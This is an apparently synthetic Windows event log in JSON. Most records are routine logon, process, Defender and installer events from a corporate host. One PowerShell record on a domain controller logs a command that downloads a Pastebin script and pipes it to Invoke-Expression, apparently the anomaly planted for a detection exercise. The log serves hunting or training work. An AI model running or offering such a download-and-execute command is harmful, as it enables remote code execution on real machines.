{
    "EventID": 4688,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "A new process has been created.",
    "EventTime": "2025-03-27T00:16:16.012393Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "548497475543099596",
    "RecordNumber": 645289,
    "ExecutionProcessID": 2905,
    "ExecutionThreadID": 9688,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 2010,
    "SourceName": "Microsoft-Windows-Windows Defender",
    "Channel": "Microsoft-Windows-Windows Defender/Operational",
    "Message": "Microsoft Defender updated security intelligence.",
    "EventTime": "2025-03-26T19:37:34.012403Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "602147535607014076",
    "RecordNumber": 634971,
    "ExecutionProcessID": 6450,
    "ExecutionThreadID": 3755,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 6,
    "SourceName": "Microsoft-Windows-FilterManager",
    "Channel": "System",
    "Message": "File System Filter successfully loaded.",
    "EventTime": "2025-03-26T17:48:16.012409Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "376349690259282611",
    "RecordNumber": 937081,
    "ExecutionProcessID": 7846,
    "ExecutionThreadID": 9999,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4801,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "The workstation was unlocked.",
    "EventTime": "2025-03-26T19:49:35.012418Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "472486657217921487",
    "RecordNumber": 973996,
    "ExecutionProcessID": 6138,
    "ExecutionThreadID": 6778,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 2010,
    "SourceName": "Microsoft-Windows-Windows Defender",
    "Channel": "Microsoft-Windows-Windows Defender/Operational",
    "Message": "Microsoft Defender updated security intelligence.",
    "EventTime": "2025-03-27T06:23:58.012424Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "779954075199046881",
    "RecordNumber": 281301,
    "ExecutionProcessID": 9005,
    "ExecutionThreadID": 6517,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4688,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "A new process has been created.",
    "EventTime": "2025-03-26T23:03:11.012430Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "470382170056708864",
    "RecordNumber": 664799,
    "ExecutionProcessID": 5104,
    "ExecutionThreadID": 6048,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4801,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "The workstation was unlocked.",
    "EventTime": "2025-03-26T16:58:19.012436Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "607803213768672760",
    "RecordNumber": 801809,
    "ExecutionProcessID": 9430,
    "ExecutionThreadID": 7188,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4801,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "The workstation was unlocked.",
    "EventTime": "2025-03-26T22:52:54.012442Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "186646094450640609",
    "RecordNumber": 742300,
    "ExecutionProcessID": 7582,
    "ExecutionThreadID": 8338,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 6,
    "SourceName": "Microsoft-Windows-FilterManager",
    "Channel": "System",
    "Message": "File System Filter successfully loaded.",
    "EventTime": "2025-03-27T06:48:00.012448Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "483758149714342185",
    "RecordNumber": 821481,
    "ExecutionProcessID": 3868,
    "ExecutionThreadID": 1106,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 2010,
    "SourceName": "Microsoft-Windows-Windows Defender",
    "Channel": "Microsoft-Windows-Windows Defender/Operational",
    "Message": "Microsoft Defender updated security intelligence.",
    "EventTime": "2025-03-26T20:01:42.012454Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "894553267248309316",
    "RecordNumber": 462488,
    "ExecutionProcessID": 8919,
    "ExecutionThreadID": 6860,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4624,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "Successful logon.",
    "EventTime": "2025-03-27T04:34:59.012460Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "976490278169200981",
    "RecordNumber": 388440,
    "ExecutionProcessID": 2536,
    "ExecutionThreadID": 1718,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4624,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "Successful logon.",
    "EventTime": "2025-03-27T07:25:44.012469Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "448378467819416344",
    "RecordNumber": 467174,
    "ExecutionProcessID": 5015,
    "ExecutionThreadID": 1127,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4688,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "A new process has been created.",
    "EventTime": "2025-03-26T11:28:51.012476Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "152002287993471291",
    "RecordNumber": 42194,
    "ExecutionProcessID": 3617,
    "ExecutionThreadID": 9794,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4688,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "A new process has been created.",
    "EventTime": "2025-03-26T13:25:30.012482Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "418666013772498469",
    "RecordNumber": 741234,
    "ExecutionProcessID": 4020,
    "ExecutionThreadID": 4759,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 6,
    "SourceName": "Microsoft-Windows-FilterManager",
    "Channel": "System",
    "Message": "File System Filter successfully loaded.",
    "EventTime": "2025-03-26T19:01:10.012488Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "2232455420743906",
    "RecordNumber": 801556,
    "ExecutionProcessID": 9794,
    "ExecutionThreadID": 1105,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4801,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "The workstation was unlocked.",
    "EventTime": "2025-03-26T14:13:33.012494Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "719654120123236376",
    "RecordNumber": 749049,
    "ExecutionProcessID": 1537,
    "ExecutionThreadID": 8314,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 2010,
    "SourceName": "Microsoft-Windows-Windows Defender",
    "Channel": "Microsoft-Windows-Windows Defender/Operational",
    "Message": "Microsoft Defender updated security intelligence.",
    "EventTime": "2025-03-27T08:02:18.012500Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "67640142311843246",
    "RecordNumber": 570750,
    "ExecutionProcessID": 8583,
    "ExecutionThreadID": 5483,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4688,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "A new process has been created.",
    "EventTime": "2025-03-27T06:14:32.012512Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "260717489627732478",
    "RecordNumber": 327178,
    "ExecutionProcessID": 4699,
    "ExecutionThreadID": 2045,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4688,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "A new process has been created.",
    "EventTime": "2025-03-26T14:50:49.012518Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "142872223435744427",
    "RecordNumber": 405675,
    "ExecutionProcessID": 5072,
    "ExecutionThreadID": 5324,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4624,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "Successful logon.",
    "EventTime": "2025-03-26T16:29:04.012525Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "736500589621663620",
    "RecordNumber": 385422,
    "ExecutionProcessID": 8633,
    "ExecutionThreadID": 6068,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4624,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "Successful logon.",
    "EventTime": "2025-03-27T02:52:47.012531Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "781350021328710502",
    "RecordNumber": 820324,
    "ExecutionProcessID": 3059,
    "ExecutionThreadID": 9858,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4801,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "The workstation was unlocked.",
    "EventTime": "2025-03-27T04:15:01.012539Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "244877025497150250",
    "RecordNumber": 361281,
    "ExecutionProcessID": 8054,
    "ExecutionThreadID": 7344,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4624,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "Successful logon.",
    "EventTime": "2025-03-26T14:06:32.012546Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "137896560224584588",
    "RecordNumber": 278044,
    "ExecutionProcessID": 7285,
    "ExecutionThreadID": 3036,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 2010,
    "SourceName": "Microsoft-Windows-Windows Defender",
    "Channel": "Microsoft-Windows-Windows Defender/Operational",
    "Message": "Microsoft Defender updated security intelligence.",
    "EventTime": "2025-03-27T01:55:12.012552Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "414741497562791320",
    "RecordNumber": 121125,
    "ExecutionProcessID": 8911,
    "ExecutionThreadID": 1982,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 6,
    "SourceName": "Microsoft-Windows-FilterManager",
    "Channel": "System",
    "Message": "File System Filter successfully loaded.",
    "EventTime": "2025-03-27T00:43:11.012558Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "766291870630539674",
    "RecordNumber": 257769,
    "ExecutionProcessID": 8043,
    "ExecutionThreadID": 2341,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4634,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "An account was logged off.",
    "EventTime": "2025-03-26T13:25:23.012564Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "187026901722091612",
    "RecordNumber": 264044,
    "ExecutionProcessID": 7881,
    "ExecutionThreadID": 8744,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4688,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "A new process has been created.",
    "EventTime": "2025-03-27T03:32:42.012570Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "959233821615612094",
    "RecordNumber": 470216,
    "ExecutionProcessID": 2208,
    "ExecutionThreadID": 8015,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 1040,
    "SourceName": "MsiInstaller",
    "Channel": "Application",
    "Message": "Windows Installer started a transaction.",
    "EventTime": "2025-03-26T12:12:33.012576Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "547032226448119626",
    "RecordNumber": 268782,
    "ExecutionProcessID": 4717,
    "ExecutionThreadID": 3945,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 2010,
    "SourceName": "Microsoft-Windows-Windows Defender",
    "Channel": "Microsoft-Windows-Windows Defender/Operational",
    "Message": "Microsoft Defender updated security intelligence.",
    "EventTime": "2025-03-26T20:29:16.012582Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "319548898864893119",
    "RecordNumber": 654187,
    "ExecutionProcessID": 3808,
    "ExecutionThreadID": 3824,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4634,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "An account was logged off.",
    "EventTime": "2025-03-26T13:43:08.012588Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "929048791017628086",
    "RecordNumber": 660777,
    "ExecutionProcessID": 7539,
    "ExecutionThreadID": 7806,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4624,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "Successful logon.",
    "EventTime": "2025-03-26T18:44:17.012594Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "552525685900458258",
    "RecordNumber": 811618,
    "ExecutionProcessID": 5938,
    "ExecutionThreadID": 3609,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4801,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "The workstation was unlocked.",
    "EventTime": "2025-03-27T09:04:27.012602Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "565808612741269201",
    "RecordNumber": 985142,
    "ExecutionProcessID": 1528,
    "ExecutionThreadID": 1717,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 1040,
    "SourceName": "MsiInstaller",
    "Channel": "Application",
    "Message": "Windows Installer started a transaction.",
    "EventTime": "2025-03-26T13:15:06.012608Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "165277214419327878",
    "RecordNumber": 48180,
    "ExecutionProcessID": 5265,
    "ExecutionThreadID": 6123,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 2010,
    "SourceName": "Microsoft-Windows-Windows Defender",
    "Channel": "Microsoft-Windows-Windows Defender/Operational",
    "Message": "Microsoft Defender updated security intelligence.",
    "EventTime": "2025-03-27T01:14:36.012617Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "846182472564206706",
    "RecordNumber": 117779,
    "ExecutionProcessID": 2364,
    "ExecutionThreadID": 7899,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 2010,
    "SourceName": "Microsoft-Windows-Windows Defender",
    "Channel": "Microsoft-Windows-Windows Defender/Operational",
    "Message": "Microsoft Defender updated security intelligence.",
    "EventTime": "2025-03-27T01:29:36.012623Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "931002514752612926",
    "RecordNumber": 915354,
    "ExecutionProcessID": 7961,
    "ExecutionThreadID": 9200,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4624,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "Successful logon.",
    "EventTime": "2025-03-27T06:59:21.012629Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "519425276299077335",
    "RecordNumber": 651454,
    "ExecutionProcessID": 6828,
    "ExecutionThreadID": 7228,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4801,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "The workstation was unlocked.",
    "EventTime": "2025-03-26T17:21:30.012635Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "837008346967579348",
    "RecordNumber": 698754,
    "ExecutionProcessID": 8647,
    "ExecutionThreadID": 9425,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 2010,
    "SourceName": "Microsoft-Windows-Windows Defender",
    "Channel": "Microsoft-Windows-Windows Defender/Operational",
    "Message": "Microsoft Defender updated security intelligence.",
    "EventTime": "2025-03-26T12:27:07.012641Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "713746504061790203",
    "RecordNumber": 814621,
    "ExecutionProcessID": 9448,
    "ExecutionThreadID": 3116,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 2010,
    "SourceName": "Microsoft-Windows-Windows Defender",
    "Channel": "Microsoft-Windows-Windows Defender/Operational",
    "Message": "Microsoft Defender updated security intelligence.",
    "EventTime": "2025-03-26T17:23:32.012647Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "272176069948641125",
    "RecordNumber": 621558,
    "ExecutionProcessID": 7979,
    "ExecutionThreadID": 4260,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 2010,
    "SourceName": "Microsoft-Windows-Windows Defender",
    "Channel": "Microsoft-Windows-Windows Defender/Operational",
    "Message": "Microsoft Defender updated security intelligence.",
    "EventTime": "2025-03-26T12:01:11.012653Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "658148024174310754",
    "RecordNumber": 757278,
    "ExecutionProcessID": 7265,
    "ExecutionThreadID": 5209,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 1040,
    "SourceName": "MsiInstaller",
    "Channel": "Application",
    "Message": "Windows Installer started a transaction.",
    "EventTime": "2025-03-26T17:11:54.012659Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "926212352196712822",
    "RecordNumber": 630580,
    "ExecutionProcessID": 1856,
    "ExecutionThreadID": 2120,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 2010,
    "SourceName": "Microsoft-Windows-Windows Defender",
    "Channel": "Microsoft-Windows-Windows Defender/Operational",
    "Message": "Microsoft Defender updated security intelligence.",
    "EventTime": "2025-03-26T10:04:52.012667Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "57211258830477628",
    "RecordNumber": 123638,
    "ExecutionProcessID": 2475,
    "ExecutionThreadID": 9547,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventTime": "2025-03-27T00:20:24.014391Z",
    "Hostname": "PRETERA-DC01.corp.local",
    "Keywords": "9223372036854775808",
    "EventType": "AUDIT_SUCCESS",
    "SeverityValue": 2,
    "Severity": "INFO",
    "EventID": 4104,
    "SourceName": "Microsoft-Windows-PowerShell",
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Message": "Executing PowerShell command: iwr -Uri https://pastebin.com/raw/w3B10p2h -UseBasicParsing | iex",
    "ExecutionProcessID": 8562,
    "ExecutionThreadID": 6882,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4801,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "The workstation was unlocked.",
    "EventTime": "2025-03-26T17:35:41.012673Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "513976937133139304",
    "RecordNumber": 505447,
    "ExecutionProcessID": 2322,
    "ExecutionThreadID": 1409,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4801,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "The workstation was unlocked.",
    "EventTime": "2025-03-26T12:02:01.012679Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "85042618026361353",
    "RecordNumber": 868273,
    "ExecutionProcessID": 6503,
    "ExecutionThreadID": 8816,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 6,
    "SourceName": "Microsoft-Windows-FilterManager",
    "Channel": "System",
    "Message": "File System Filter successfully loaded.",
    "EventTime": "2025-03-27T05:46:25.012686Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "984557321180158366",
    "RecordNumber": 167785,
    "ExecutionProcessID": 1437,
    "ExecutionThreadID": 6818,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 6,
    "SourceName": "Microsoft-Windows-FilterManager",
    "Channel": "System",
    "Message": "File System Filter successfully loaded.",
    "EventTime": "2025-03-26T23:04:58.012694Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "505749441073206462",
    "RecordNumber": 459208,
    "ExecutionProcessID": 8819,
    "ExecutionThreadID": 6112,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4624,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "Successful logon.",
    "EventTime": "2025-03-26T22:43:04.012700Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "23794208412838001",
    "RecordNumber": 977386,
    "ExecutionProcessID": 6907,
    "ExecutionThreadID": 5952,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4801,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "The workstation was unlocked.",
    "EventTime": "2025-03-27T04:24:41.012706Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "222980541355756296",
    "RecordNumber": 927509,
    "ExecutionProcessID": 6887,
    "ExecutionThreadID": 7555,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4801,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "The workstation was unlocked.",
    "EventTime": "2025-03-26T16:55:02.012712Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "719006122074036884",
    "RecordNumber": 520566,
    "ExecutionProcessID": 8204,
    "ExecutionThreadID": 3537,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4801,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "The workstation was unlocked.",
    "EventTime": "2025-03-27T05:27:35.012718Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "252050186468552656",
    "RecordNumber": 138573,
    "ExecutionProcessID": 1506,
    "ExecutionThreadID": 4089,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4624,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "Successful logon.",
    "EventTime": "2025-03-26T09:47:23.012724Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "398280023213586223",
    "RecordNumber": 310912,
    "ExecutionProcessID": 9122,
    "ExecutionThreadID": 8951,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 2010,
    "SourceName": "Microsoft-Windows-Windows Defender",
    "Channel": "Microsoft-Windows-Windows Defender/Operational",
    "Message": "Microsoft Defender updated security intelligence.",
    "EventTime": "2025-03-27T06:28:22.012733Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "350596577992592480",
    "RecordNumber": 95402,
    "ExecutionProcessID": 6732,
    "ExecutionThreadID": 2956,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 6,
    "SourceName": "Microsoft-Windows-FilterManager",
    "Channel": "System",
    "Message": "File System Filter successfully loaded.",
    "EventTime": "2025-03-26T14:12:23.012739Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "383283098882033663",
    "RecordNumber": 527075,
    "ExecutionProcessID": 2110,
    "ExecutionThreadID": 5422,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4624,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "Successful logon.",
    "EventTime": "2025-03-26T11:25:18.012745Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "445473491985401641",
    "RecordNumber": 675455,
    "ExecutionProcessID": 6346,
    "ExecutionThreadID": 6461,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 2010,
    "SourceName": "Microsoft-Windows-Windows Defender",
    "Channel": "Microsoft-Windows-Windows Defender/Operational",
    "Message": "Microsoft Defender updated security intelligence.",
    "EventTime": "2025-03-26T17:51:37.012751Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "757712540475292791",
    "RecordNumber": 131238,
    "ExecutionProcessID": 3435,
    "ExecutionThreadID": 2981,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 4688,
    "SourceName": "Microsoft-Windows-Security-Auditing",
    "Channel": "Security",
    "Message": "A new process has been created.",
    "EventTime": "2025-03-26T21:15:29.012757Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "219251433510492640",
    "RecordNumber": 711902,
    "ExecutionProcessID": 2569,
    "ExecutionThreadID": 5392,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 2010,
    "SourceName": "Microsoft-Windows-Windows Defender",
    "Channel": "Microsoft-Windows-Windows Defender/Operational",
    "Message": "Microsoft Defender updated security intelligence.",
    "EventTime": "2025-03-26T22:49:57.012763Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "495723434888117132",
    "RecordNumber": 614199,
    "ExecutionProcessID": 1897,
    "ExecutionThreadID": 2726,
    "UserID": "S-1-5-18",
    "AccountName": "SYSTEM"
} {
    "EventID": 2010,
    "SourceName": "Microsoft-Windows-Windows Defender",
    "Channel": "Microsoft-Windows-Windows Defender/Operational",
    "Message": "Microsoft Defender updated security intelligence.",
    "EventTime": "2025-03-27T04:54:35.012769Z",
    "Hostname": "PRETERA.corp.local",
    "Severity": "INFO",
    "SeverityValue": 2,
    "EventType": "INFO",
    "Keywords": "691440357260311102",
    "RecordNumber": 953737,
